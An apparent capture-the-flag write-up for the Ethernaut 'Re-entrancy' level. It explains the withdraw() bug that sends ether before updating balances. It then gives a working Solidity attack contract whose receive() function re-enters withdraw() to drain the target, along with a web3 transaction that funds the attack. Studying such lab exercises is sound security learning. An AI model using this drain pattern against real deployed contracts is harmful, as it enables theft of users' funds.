# Level 10: [Re-entrancy](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

## Level objectives:
1. Drain the contract.

## Analysis (lol)
- Classic re-entrancy vulnerability.
```sol
if(balances[msg.sender] >= _amount) {
  (bool result,) = msg.sender.call{value:_amount}("");
  ...
  balances[msg.sender] -= _amount;
```
- In withdraw(), the contract sends us some ether before changing our balance in the contract.
- So before the contract can change the balance[msg.sender], we call withdraw again.
- Do so using the fallback receive() function of our contract.

## Steps:

```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Reentrancy {
    function withdraw(uint _amount) external;
}

contract AttackReentrancy {
    Reentrancy victim = Reentrancy(0x671eA28bB06697f0de39616260Ed0fBE4b15602c);

    constructor() payable {}

    function attack() public {
        victim.withdraw(997790000300296);
    }

    receive() external payable {
        victim.withdraw(msg.value);
    }
}
```
- For the withdraw() to work, we need to send ether to the vuln contract using the donate function.
```js
web3.eth.sendTransaction({
  to: "0x671eA28bB06697f0de39616260Ed0fBE4b15602c",
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
  value: "997790000300296",
  data: web3.eth.abi.encodeFunctionCall({
    name: "donate",
    type: "function",
    inputs: [{
      type: "address",
      name: "_to"
    }]
  }, ["0xBaC5b975FF516ac9d3a88a20A6820A3BeD430e28"])
```
